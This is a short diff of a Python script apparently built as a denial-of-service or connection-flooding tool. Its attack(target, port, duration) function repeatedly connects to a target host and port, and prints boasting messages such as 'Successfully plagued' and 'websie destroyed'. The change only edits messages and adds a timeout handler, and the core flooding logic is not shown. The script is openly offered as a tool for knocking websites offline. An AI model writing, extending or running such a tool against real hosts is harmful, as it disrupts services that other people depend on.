@@ -24,11 +24,13 @@ def attack(target, port, duration):
             end = time.time()
             ping = round((end - start) * 1000, 2)
             print(f"Successfully plagued {target}:{port}! 🤢🦠 | Ping: {ping}ms")
+        except socket.timeout:
+            print("websie destroyed")
         except Exception as e:
             print(f"Error: {e}")
         finally:
             s.close()
-    print(f"Attack completed on {target}:{port}.")
+    print(f"Attack ended on {target}:{port}.")
 
 def main():
     os.system('clear' if os.name == 'posix' else 'cls')
